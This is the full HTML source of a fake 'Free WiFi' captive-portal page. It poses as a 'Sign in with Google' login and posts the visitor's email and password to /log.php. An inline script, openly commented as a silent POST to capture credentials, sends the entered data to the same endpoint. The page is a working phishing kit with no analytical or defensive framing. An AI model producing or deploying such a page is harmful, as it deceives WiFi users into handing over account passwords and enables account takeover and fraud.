<!DOCTYPE html>
<html>
<head>
    <title>Free WiFi - Sign in to continue</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        @import url('https://fonts.googleapis.com/css?family=Roboto');
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Roboto', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height:100vh; display:flex; align-items:center; justify-content:center; }
        .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
        .logo { text-align:center; margin-bottom: 30px; }
        .logo img { width: 80px; }
        h2 { color: #4285f4; text-align:center; margin-bottom: 30px; font-size: 24px; }
        input[type="email"], input[type="password"] { width:100%; padding:15px; margin:10px 0; border:2px solid #ddd; border-radius:5px; font-size:16px; }
        input[type="email"]:focus, input[type="password"]:focus { outline:none; border-color: #4285f4; }
        button { width:100%; padding:15px; background: #4285f4; color:white; border:none; border-radius:5px; font-size:16px; cursor:pointer; }
        button:hover { background: #3367d6; }
        .terms { text-align:center; font-size:12px; color:#666; margin-top:15px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">📶</div>
        <h2>Continue to Free WiFi</h2>
        <form method="POST" action="/log.php">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in with Google</button>
        </form>
        <div class="terms">By signing in, you agree to Free WiFi Terms of Service</div>
    </div>
    
    <script>
    document.querySelector('form').onsubmit = function() {
        // Silent POST to capture creds
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/log.php', true);
        xhr.send(new FormData(this));
        return true;
    };
    </script>
</body>
</html>
